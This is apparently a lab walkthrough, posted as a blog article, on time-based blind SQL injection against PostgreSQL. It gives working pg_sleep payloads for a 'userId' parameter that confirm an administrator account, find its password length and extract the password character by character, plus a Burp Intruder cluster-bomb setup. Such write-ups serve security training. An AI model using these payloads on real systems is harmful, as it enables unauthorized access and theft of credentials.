# :game_die: Time Based Blind Sql Injection Hack The Clock Ae15B0Aad295

---

## Blind SQL injection with time delays and information retrieval

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.→ → Consider the Vulnerable parameter is `userId`

```
userId=1' || (SELECT CASE WHEN(1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END)--
```

➡ Verify that the application takes 10 seconds to respond.

Now, Change it to :

```
userId=1' || (SELECT CASE WHEN(1=2) THEN pg_sleep(10) ELSE pg_sleep(-1) END)--
```

➡ Verify that the application responds immediately with no time delay. This demonstrates how you can test a single boolean condition and infer the result.

### → → Check the existence of administrator from users table

```
userId=1' || (SELECT CASE WHEN(username='administrator') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--
```

✅ Verify that the condition is true, confirming that there is a user called `administrator.`

### → → To determine how many characters are in the password of the administrator

```
userId=1' || (SELECT CASE WHEN(username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--
```

✅ This condition should be true, confirming that the password is greater than 1 character in length.

## Get Saswath Vel’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Repeat increasing the number each time manually or use Burp Intruder…

```
LENGTH(password)>2
LENGTH(password)>3
...
```

After determining the length of the password, the next step is to test the character at each position to determine its value. We need to use Burp Intruder for this…

```
userId=1' || (SELECT CASE WHEN(username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--
```

This uses the `SUBSTRING()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.

In Burp Intruder

```
userId=1' || (SELECT CASE WHEN(username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--
```

Using Cluster Bomb →

- §1§ → Will be replaced with position index (`1` to `20`)

- §a§ → Will be replaced with character guesses (`a` to `z`, `0` to `9`)

### Payloads Tab Setup

Payload Set 1 (Position)

- Type: Numbers

- From: `1` to `20` (or however long the password is)

- Step: `1`

Payload Set 2 (Character)

- Type: Brute Forcer

- Set Min length: 1

- Set Max length: 1

— — Launch the attack by clicking the “ Start attack” button.

Review the attack results to find the value of the character at the offset. You should see a column in the results called Response received. This will generally contain a small number, representing the number of milliseconds the application took to respond. One of the rows should have a larger number in this column, in the region of 10,000 milliseconds.

→ → Use the password to log in as the `administrator` user.

---
